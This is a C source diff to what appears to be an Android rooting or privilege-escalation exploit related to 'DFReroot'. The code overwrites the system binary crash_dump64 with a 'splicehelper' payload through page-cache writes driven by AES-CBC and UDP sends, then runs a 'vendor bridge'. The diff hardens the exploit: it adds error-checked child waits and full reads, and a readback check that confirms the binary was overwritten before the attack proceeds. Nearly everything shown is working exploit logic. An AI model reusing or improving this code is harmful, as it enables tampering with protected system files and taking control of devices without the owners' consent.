@@ -20,6 +20,7 @@
 #include "reporter.h"
 #include "aes256.h"
 #include "hmac_sha256.h"
+#include "native_io.h"
 
 /*
  * The reporter is resolved from the object it was handed, not from a class name - see reporter.h, which is
@@ -95,13 +96,23 @@ static int read_vendor_content(off_t offset, uint8_t buf[16], struct Reporter *r
     }
     close(rdpipe[1]);
     int status;
-    TEMP_FAILURE_RETRY(waitpid(pid, &status, 0));
+    if (df_wait_for_child(pid, &status) < 0) {
+        int error = errno;
+        close(rdpipe[0]);
+        REPORTLN("read_vendor wait at 0x%lx failed: %s", (long)offset, strerror(error));
+        return -1;
+    }
     int n = 0;
-    if (WIFEXITED(status) && WEXITSTATUS(status) == 0)
-        n = (int)TEMP_FAILURE_RETRY(read(rdpipe[0], buf, 16));
+    int read_error = 0;
+    if (WIFEXITED(status) && WEXITSTATUS(status) == 0) {
+        n = (int)df_read_full(rdpipe[0], buf, 16);
+        if (n < 0) read_error = errno;
+    }
     close(rdpipe[0]);
     if (n != 16) {
-        if (WIFEXITED(status))
+        if (read_error)
+            REPORTLN("read_vendor at 0x%lx failed: %s", (long)offset, strerror(read_error));
+        else if (WIFEXITED(status))
             REPORTLN("read_vendor at 0x%lx got %d bytes (exit %d)",
                      (long)offset, n, WEXITSTATUS(status));
         else if (WIFSIGNALED(status))
@@ -163,7 +174,10 @@ static int do_one_write_cbc(int sk_send, int file_fd, off_t offset,
             _exit(1);
         }
         int st;
-        TEMP_FAILURE_RETRY(waitpid(pid, &st, 0));
+        if (df_wait_for_child(pid, &st) < 0) {
+            REPORTLN("splice helper wait failed: %s", strerror(errno));
+            goto out_pipe;
+        }
         if (!(WIFEXITED(st) && WEXITSTATUS(st) == 0)) {
             REPORTLN("splice helper failed status=0x%x", st);
             goto out_pipe;
@@ -271,8 +285,42 @@ static int patch_file_cbc(const char *path, const char *payload, size_t len,
 
     if (!use_helper) close(file_fd);
     close(sk_send);
-    if (rc == 0) REPORTLN("patched %zu bytes to %s+0x%zx", len, path, foff);
+    if (rc == 0) REPORTLN("sent %zu patch bytes for %s+0x%zx; readback not yet verified", len, path, foff);
     return rc;
+}
+
+/* A completed UDP send does not establish a page-cache write. Verify the whole
+ * first patch before executing the bridge. The short bounded wait allows already
+ * submitted packets to finish; it never resubmits a write. */
+static int verify_first_patch(const void *expected, size_t length, struct Reporter *reporter) {
+    int fd = open(kCrashDump, O_RDONLY | O_CLOEXEC);
+    if (fd < 0) {
+        REPORTLN("patch #1 readback open failed: %s", strerror(errno));
+        return -1;
+    }
+    struct df_readback_result reading;
+    for (unsigned int attempt = 0; attempt < 101; ++attempt) {
+        int result = df_verify_fd(fd, 0, expected, length, &reading);
+        if (result == 0) {
+            close(fd);
+            REPORTLN("patch #1 readback verified: %zu bytes match", length);
+            return 0;
+        }
+        if (result < 0) {
+            close(fd);
+            if (reading.error)
+                REPORTLN("patch #1 readback at 0x%zx failed: %s", reading.position, strerror(reading.error));
+            else
+                REPORTLN("patch #1 readback ended at 0x%zx before %zu bytes", reading.position, length);
+            return -1;
+        }
+        if (attempt < 100) usleep(10000);
+    }
+    close(fd);
+    REPORTLN("patch #1 readback mismatch at 0x%zx: expected %02x, observed %02x",
+             reading.position, (unsigned int)reading.expected, (unsigned int)reading.actual);
+    REPORTLN("the first patch was not observed; stopping before the vendor bridge");
+    return -1;
 }
 
 /* ---- KO and splicehelper blobs (identical layout to DFReroot) ---- */
@@ -392,6 +440,7 @@ static int patch_ko(struct Reporter *reporter) {
     if (!sh_buf) return -1;
     REPORTLN("* patch #1 (crash_dump64 ← splicehelper, %zu bytes)", sh_len_padded);
     int ret = patch_file_cbc(kCrashDump, sh_buf, sh_len_padded, 0, 0, reporter);
+    if (ret == 0) ret = verify_first_patch(sh_buf, sh_len_padded, reporter);
     free(sh_buf);
     if (ret) { REPORTLN("patch #1 failed: %d", ret); return ret; }
 
